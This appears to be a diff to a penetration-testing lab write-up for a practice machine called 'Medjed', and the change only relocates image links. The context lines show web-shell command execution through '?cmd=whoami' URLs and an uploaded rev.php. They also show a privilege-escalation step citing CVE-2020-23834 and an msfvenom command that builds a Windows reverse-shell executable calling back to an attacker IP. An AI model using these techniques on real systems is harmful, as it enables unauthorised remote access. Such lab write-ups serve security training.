@@ -175,48 +175,64 @@ SMB         192.168.207.127 445    MEDJED           [-] medjed\anonymous:anonymo
 ## 8000 HTTP
 * STEP 1
 `http://192.168.207.127:8000` -> `http://192.168.207.127:8000/Config-Wizard/wizard/SetAdmin.lsp`
-![image](https://hackmd.io/_uploads/Hk7FWpUcbg.png)
+
+  ![image](_assets/Hk7FWpUcbg.png)
 
 * STEP 2
 I set up some easy password then got redirected to `http://192.168.207.127:8000/Config-Wizard/intro/`
-![image](https://hackmd.io/_uploads/H1cOGTIqWl.png)
+
+  ![image](_assets/H1cOGTIqWl.png)
 
 * STEP 3
 `http://192.168.207.127:8000/rtl/about.lsp`
 cve seems could use for Privilege Escalation 
-![image](https://hackmd.io/_uploads/rk0eQ6IqZl.png)
-![image](https://hackmd.io/_uploads/SyjRBp8qWg.png)
+
+  ![image](_assets/rk0eQ6IqZl.png)
+
+  ![image](_assets/SyjRBp8qWg.png)
 
 * STEP 4
 `http://192.168.207.127:8000/rtl/protected/wfslinks.lsp`
-![image](https://hackmd.io/_uploads/HJON8pU5bl.png)
+
+  ![image](_assets/HJON8pU5bl.png)
+
 `http://192.168.207.127:8000/fs/`
-![image](https://hackmd.io/_uploads/HylUUpIq-l.png)
-![image](https://hackmd.io/_uploads/HkN5IaUqbg.png)
+
+  ![image](_assets/HylUUpIq-l.png)
+
+  ![image](_assets/HkN5IaUqbg.png)
 
 * STEP 5
 `http://192.168.207.127:8000/fs/?cmd=whoami`
-![image](https://hackmd.io/_uploads/B1VFw68c-x.png)
+
+  ![image](_assets/B1VFw68c-x.png)
 
 * STEP 6
 `https://192.168.207.127:44330/fs/C/`
 It seems taht I can upload a file anywhere in C disk, but can trigger download when click on test.php file
-![image](https://hackmd.io/_uploads/BkVCiTUcWg.png)
-![image](https://hackmd.io/_uploads/SJT7iCU5Wl.png)
-![image](https://hackmd.io/_uploads/SkPYoRU9Wl.png)
+
+  ![image](_assets/BkVCiTUcWg.png)
+
+  ![image](_assets/SJT7iCU5Wl.png)
+
+  ![image](_assets/SkPYoRU9Wl.png)
 
 
 ## 45443 HTTP
 * STEP 1
 `http://192.168.207.127:45443/`
 Another service host by target, found its source file in `https://192.168.207.127:44330/fs/C/xampp/htdocs/`
-![image](https://hackmd.io/_uploads/Hy4o8RIqZe.png)
-![image](https://hackmd.io/_uploads/B1aI8R85bl.png)
+
+  ![image](_assets/Hy4o8RIqZe.png)
+
+  ![image](_assets/B1aI8R85bl.png)
 
 * STEP 2
 `http://192.168.207.127:45443/rev.php?cmd=whoami`
-![image](https://hackmd.io/_uploads/HJAOn0Iq-e.png)
-![image](https://hackmd.io/_uploads/Hklh2085Zl.png)
+
+  ![image](_assets/HJAOn0Iq-e.png)
+
+  ![image](_assets/Hklh2085Zl.png)
 
 ## Privilege Escalation
 1. `whoami /all`
@@ -291,7 +307,9 @@ d-----        10/16/2020   6:51 PM                xampp
 ```
 
 3. `CVE-2020-23834`
-![image](https://hackmd.io/_uploads/H1PnTRIcWx.png)
+
+   ![image](_assets/H1PnTRIcWx.png)
+
 ```
 ┌──(.venv)─(kali㉿kali)-[~/Desktop/Pen200/Medjed]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.225 LPORT=4445 -f exe -o reverse.exe
